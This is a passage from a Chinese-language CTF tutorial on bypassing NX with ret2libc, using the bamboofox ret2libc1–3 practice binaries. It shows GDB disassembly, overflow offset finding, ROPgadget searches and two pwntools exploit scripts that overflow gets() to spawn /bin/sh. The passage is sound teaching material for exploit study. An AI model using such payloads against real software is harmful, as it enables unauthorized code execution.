zone，这是一块被保留的内存，不会被信号或者中断所修改。</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gef➤ disassemble main </span><br><span class="line">0x000000000040050a &lt;+0&gt;: push rbp                    # 将栈底 rbp 压栈 (rsp -= 8) </span><br><span class="line">0x000000000040050b &lt;+1&gt;: mov rbp,rsp                 # 更新 rbp 为当前栈顶 rsp </span><br><span class="line">0x000000000040050e &lt;+4&gt;: push 0x58                   # 将 arg8 压栈 (rsp -= 8) </span><br><span class="line">0x0000000000400510 &lt;+6&gt;: push 0x4d                   # 将 arg7 压栈 (rsp -= 8) </span><br><span class="line">0x0000000000400512 &lt;+8&gt;: mov r9d,0x42                # 将 arg6 赋值给 r9 </span><br><span class="line">0x0000000000400518 &lt;+14&gt;: mov r8d,0x37               # 将 arg5 赋值给 r8 </span><br><span class="line">0x000000000040051e &lt;+20&gt;: mov ecx,0x2c               # 将 arg4 赋值给 rcx </span><br><span class="line">0x0000000000400523 &lt;+25&gt;: mov edx,0x21               # 将 arg3 赋值给 rdx </span><br><span class="line">0x0000000000400528 &lt;+30&gt;: mov esi,0x16               # 将 arg2 赋值给 rsi </span><br><span class="line">0x000000000040052d &lt;+35&gt;: mov edi,0xb                # 将 arg1 赋值给 rdi </span><br><span class="line">0x0000000000400532 &lt;+40&gt;: call 0x4004d6 &lt;func&gt;       # 调用 func (push 0x400537) </span><br><span class="line">0x0000000000400537 &lt;+45&gt;: add rsp,0x10               # 恢复栈顶 rsp </span><br><span class="line">0x000000000040053b &lt;+49&gt;: leave                      # (mov rsp, rbp; pop rbp) </span><br><span class="line">0x000000000040053c &lt;+50&gt;: ret                        # 函数返回 (pop rip) </span><br><span class="line">gef➤ disassemble func </span><br><span class="line">0x00000000004004d6 &lt;+0&gt;: push rbp                    # 将栈底 rbp 压栈 (rsp -= 8) </span><br><span class="line">0x00000000004004d7 &lt;+1&gt;: mov rbp,rsp                 # 更新 rbp 为当前栈顶 rsp </span><br><span class="line">0x00000000004004da &lt;+4&gt;: mov DWORD PTR [rbp-0x14],edi </span><br><span class="line">0x00000000004004dd &lt;+7&gt;: mov DWORD PTR [rbp-0x18],esi </span><br><span class="line">0x00000000004004e0 &lt;+10&gt;: mov DWORD PTR [rbp-0x1c],edx </span><br><span class="line">0x00000000004004e3 &lt;+13&gt;: mov DWORD PTR [rbp-0x20],ecx </span><br><span class="line">0x00000000004004e6 &lt;+16&gt;: mov DWORD PTR [rbp-0x24],r8d </span><br><span class="line">0x00000000004004ea &lt;+20&gt;: mov DWORD PTR [rbp-0x28],r9d </span><br><span class="line">0x00000000004004ee &lt;+24&gt;: mov eax,DWORD PTR [rbp-0x14] </span><br><span class="line">0x00000000004004f1 &lt;+27&gt;: add eax,0x1 </span><br><span class="line">0x00000000004004f4 &lt;+30&gt;: mov DWORD PTR [rbp-0x8],eax </span><br><span class="line">0x00000000004004f7 &lt;+33&gt;: mov eax,DWORD PTR [rbp+0x18] </span><br><span class="line">0x00000000004004fa &lt;+36&gt;: add eax,0x8 </span><br><span class="line">0x00000000004004fd &lt;+39&gt;: mov DWORD PTR [rbp-0x4],eax </span><br><span class="line">0x0000000000400500 &lt;+42&gt;: mov edx,DWORD PTR [rbp-0x8] </span><br><span class="line">0x0000000000400503 &lt;+45&gt;: mov eax,DWORD PTR [rbp-0x4] </span><br><span class="line">0x0000000000400506 &lt;+48&gt;: add eax,edx                # 计算返回值 </span><br><span class="line">0x0000000000400508 &lt;+50&gt;: pop rbp                    # 恢复 rbp (rsp += 8) </span><br><span class="line">0x0000000000400509 &lt;+51&gt;: ret                        # 函数返回 (pop rip)</span><br></pre></td></tr></table></figure><blockquote><h2 id="绕过NX保护"><a href="#绕过NX保护" class="headerlink" title="绕过NX保护"></a>绕过NX保护</h2></blockquote><h3 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h3><p>Bypass DEP 通过ret2libc绕过DEP防护，现在我们把DEP打开，依然关闭stack protector和ASLR。这时候我们按上篇无保护的思路来做题的话，系统会拒绝执行我们的shellcode。如果你通过<code>sudo cat /proc/[pid]/maps</code>查看，stack是rw的而不是rwx。</p><p>三道题分布对应下面三个小结</p><ul><li><a href="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/ret2libc1">ret2libc1</a></li><li><a href="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/ret2libc2">ret2libc2</a></li><li><a href="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/ret2libc3">ret2libc3</a></li></ul><hr><h4 id="存在system-函数和-x2F-bin-x2F-sh字符串"><a href="#存在system-函数和-x2F-bin-x2F-sh字符串" class="headerlink" title="存在system()函数和&#x2F;bin&#x2F;sh字符串"></a>存在system()函数和&#x2F;bin&#x2F;sh字符串</h4><p>以 bamboofox 中 ret2libc1 为例，首先，我们可以检查一下程序的安全保护</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ checksec ret2libc1</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/Desktop/ret2libc1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在执行 gets 函数的时候出现了栈溢出，接着定位溢出值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 200</span><br><span class="line"><span class="string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#x27;</span></span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: /home/kali/Desktop/ret2libc1 </span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb0580 --&gt; 0xfbad2288 </span><br><span class="line">EDX: 0xfbad2288 </span><br><span class="line">ESI: 0xf7fb0000 --&gt; 0x1e4d6c </span><br><span class="line">EDI: 0xf7fb0000 --&gt; 0x1e4d6c </span><br><span class="line">EBP: 0x6941414d (<span class="string">&#x27;MAAi&#x27;</span>)</span><br><span class="line">ESP: 0xffffd220 (<span class="string">&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">EIP: 0x41384141 (<span class="string">&#x27;AA8A&#x27;</span>)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41384141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd220 (<span class="string">&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0004| 0xffffd224 (<span class="string">&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0008| 0xffffd228 (<span class="string">&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0012| 0xffffd22c (<span class="string">&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0016| 0xffffd230 (<span class="string">&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0020| 0xffffd234 (<span class="string">&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0024| 0xffffd238 (<span class="string">&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0028| 0xffffd23c (<span class="string">&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41384141</span><br><span class="line">1094205761 found at offset: 112</span><br></pre></td></tr></table></figure><p>可以看到溢出的位置在112的地方</p><p>接着利用<strong>ropgadget</strong>，查看是否有<code>/bin/sh</code>存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ ROPgadget --binary ret2libc1 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure><p>并且在IDA中可以看到有<code>system</code>这个函数，如果没有开启ASRL的话再Windows上面看到的地址和你在Linux运行后的地址是相同的</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/12.png" alt="image-20201120115231916"></p><p>我们要的东西都齐了以后，接下来就是写EXP了，EXP中栈拼接对应上面的利用原理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;../ret2libc1&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x08048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/13.png" alt="image-20201120115749503"></p><hr><h4 id="只存在system-函数"><a href="#只存在system-函数" class="headerlink" title="只存在system()函数"></a>只存在system()函数</h4><p>以 bamboofox 中 ret2libc2为例，拿到文件依旧进行查看保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ checksec ret2libc2</span><br><span class="line">[*] <span class="string">&#x27;/home/ascotbe/Desktop/Pwn/ret2libc2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>接着我们可以看到溢出函数依旧是上文中的那个并且<code>system()</code>的地址是<strong>0x08048490</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/14.png" alt="image-20201120142854442"></p><p>但是我们用ROPgadget并无找到<code>/bin/sh</code>位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ ROPgadget --binary ret2libc2 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure><p>那我们怎么获取字符串呢？我们在PLT表中可以看到有一个<code>gets()</code>函数，这个函数可以用来获取字符串，并且地址为<strong>0x08048460</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/15.png" alt="image-20201120144606722"></p><p>反汇编查看一下该函数</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/16.png" alt="image-20201120144720027"></p><p>发现传入一个指针后即可返回指针指向的字符串，那么接着我们只需要找到一个可读可写的buffer区，通常会寻找<code>.bss</code>段，通过<strong>readelf</strong>命令来查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ readelf -S ret2libc2</span><br><span class="line">There are 35 section headers, starting at offset 0x1924:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000f0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          080482c8 0002c8 000096 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804835e 00035e 00001e 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804837c 00037c 000030 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080483ac 0003ac 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             080483c4 0003c4 000058 08   A  5  12  4</span><br><span class="line">  [11] .init             PROGBITS        0804841c 00041c 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048440 000440 0000c0 04  AX  0   0 16</span><br><span class="line">  [13] .text             PROGBITS        08048500 000500 000242 00  AX  0   0 16</span><br><span class="line">  [14] .fini             PROGBITS        08048744 000744 000014 00  AX  0   0  4</span><br><span class="line">  [15] .rodata           PROGBITS        08048758 000758 000065 00   A  0   0  4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS        080487c0 0007c0 000034 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame         PROGBITS        080487f4 0007f4 0000d0 00   A  0   0  4</span><br><span class="line">  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        0804a000 001000 000038 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a038 001038 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a040 001040 0000a4 00  WA  0   0 32</span><br><span class="line">  [26] .comment          PROGBITS        00000000 001040 00002b 01  MS  0   0  1</span><br><span class="line">  [27] .debug_aranges    PROGBITS        00000000 00106b 000020 00      0   0  1</span><br><span class="line">  [28] .debug_info       PROGBITS        00000000 00108b 000329 00      0   0  1</span><br><span class="line">  [29] .debug_abbrev     PROGBITS        00000000 0013b4 0000f8 00      0   0  1</span><br><span class="line">  [30] .debug_line       PROGBITS        00000000 0014ac 0000c2 00      0   0  1</span><br><span class="line">  [31] .debug_str        PROGBITS        00000000 00156e 00026d 01  MS  0   0  1</span><br><span class="line">  [32] .shstrtab         STRTAB          00000000 0017db 000146 00      0   0  1</span><br><span class="line">  [33] .symtab           SYMTAB          00000000 001e9c 000540 10     34  50  4</span><br><span class="line">  [34] .strtab           STRTAB          00000000 0023dc 000314 00      0   0  1</span><br></pre></td></tr></table></figure><p>我们可以发现<strong>.bss</strong>是从<strong>0x0804a040</strong>的位置开始的，然后按着这个段找到了<strong>0x0804A080</strong>这个位置是个char数组</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/17.png" alt="image-20201120182503721"></p><p>接着可以看到<strong>.bss</strong>是能读写，由于程序在gdb中运行，就算关闭了ALSR也会和在gdb外运行不同。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop/Pwn$ gdb -q ret2libc2</span><br><span class="line">Reading symbols from ret2libc2...</span><br><span class="line">gdb-peda$ run </span><br><span class="line">Starting program: /home/kali/Desktop/Pwn/ret2libc2 </span><br><span class="line">Something surprise here, but I don<span class="string">&#x27;t think it will work.</span></span><br><span class="line"><span class="string">What do you think ?</span></span><br><span class="line"><span class="string">[Inferior 1 (process 10047) exited normally]</span></span><br><span class="line"><span class="string">Warning: not running</span></span><br><span class="line"><span class="string">gdb-peda$ vmmap</span></span><br><span class="line"><span class="string">Warning: not running</span></span><br><span class="line"><span class="string">Start      End        Perm      Name</span></span><br><span class="line"><span class="string">0x0804841c 0x08048758 rx-p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br><span class="line"><span class="string">0x08048154 0x080488c4 r--p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br><span class="line"><span class="string">0x08049f08 0x0804a0e4 rw-p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br></pre></td></tr></table></figure><p>接着寻找<code>add esp, 4</code>这样的指令，至于为什么呢因为我们调用gets()函数的时候push了一个参数也就是<code>/bin/sh</code>，函数结束的话如果不让堆栈平衡，那么最后结束整个函数的时候ebp的值回比原来低，具体低4个字节还是8个看进程的位数去。最后在这题结束会放个c程序调试的例子作为解释</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ ROPgadget --binary ret2libc2 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804872f : pop ebp ; ret</span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br><span class="line">0x0804872e : pop edi ; pop ebp ; ret</span><br><span class="line">0x0804872d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048426 : ret</span><br><span class="line">0x0804857e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure><p>万事具备我们就直接构造EXP即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_gets_addr = <span class="number">0x08048460</span></span><br><span class="line">libc_system_addr = <span class="number">0x08048490</span></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x0804843d</span></span><br><span class="line">payload = flat([<span class="string">&quot;A&quot;</span> * <span class="number">0x70</span>, libc_gets_addr, pop_ebx_addr, buf2_addr, libc_system_addr, <span class="string">&#x27;6666&#x27;</span>, buf2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行流程</span></span><br><span class="line">PUSH 参数-&gt;PUSH 返回地址-&gt;JMP system函数地址-&gt;PUSH 参数（进入CALL调用栈中）-&gt;POP 参数(由于为了堆栈平衡之前PUSH了参数)-&gt;CALL gets函数</span><br><span class="line"><span class="comment">#伪C++代码类似下面</span></span><br><span class="line">system(gets(*buf2))</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/18.png" alt="image-20201120190619022"></p><hr><h4 id="无system-函数和-x2F-bin-x2F-sh字符串"><a href="#无system-函数和-x2F-bin-x2F-sh字符串" class="headerlink" title="无system()函数和&#x2F;bin&#x2F;sh字符串"></a>无system()函数和&#x2F;bin&#x2F;sh字符串</h4><p>首先查看保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ checksec ./ret2libc3</span><br><span class="line">[*] <span class="string">&#x27;/home/ascotbe/Desktop/Pwn/ret2libc3&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以发现是加载<strong>libc.so</strong>动态链接库的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ i sharedlibrary </span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line"><span class="number">0xf7fd2100</span>  <span class="number">0xf7fef7f3</span>  Yes (*)     /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xf7de81d0</span>  <span class="number">0xf7f4171a</span>  Yes (*)     /lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">(*): Shared library is missing debugging information.</span><br></pre></td></tr></table></figure><p>可以发现没有<code>system()</code>函数和<code>/bin/sh</code>字符串了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/20.png" alt="image-20201121103715703"></p><p>由于他加载了<strong>libc.so</strong>，那么我们可以明确几点</p><ul><li><p>动态链接库中的函数之间相对偏移是固定的</p></li><li><p>A 真实地址 (内存物理地址) - A 偏移地址 &#x3D; B 真实地址 (内存物理地址) -B 偏移地址 &#x3D; 